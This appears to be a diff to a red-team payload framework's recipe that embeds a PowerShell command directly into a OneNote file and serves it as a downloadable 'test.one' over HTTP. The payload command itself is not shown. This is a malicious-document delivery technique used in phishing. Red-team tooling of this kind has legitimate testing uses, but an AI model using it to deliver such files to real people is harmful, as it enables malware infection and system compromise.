@@ -23,16 +23,16 @@ def recipe_4():
     cmd = AceStr("powershell -c \"{}\"".format(psCommand))
 
     # BAT
-    bat = makeBatFromCmdByFtp(cmd)
+    # bat = makeBatFromCmdByFtp(cmd)
     # batFile: AceFile = makeAceFile("test.bat", bat)  # for debugging
 
     # OneNote
-    onenote = makeOnenoteFromBat(bat)
+    onenote = makeOnenoteFromBat(cmd)
     #onenoteFile: AceFile = makeAceFile("test.one", onenote)  # for debugging
 
     # Serve
     containerServe: AceRoute = AceRoute('/test.one', onenote, download=True, downloadName='test.one')
     routes.append(containerServe)
-    #serve(routes)
+    serve(routes)
 
 
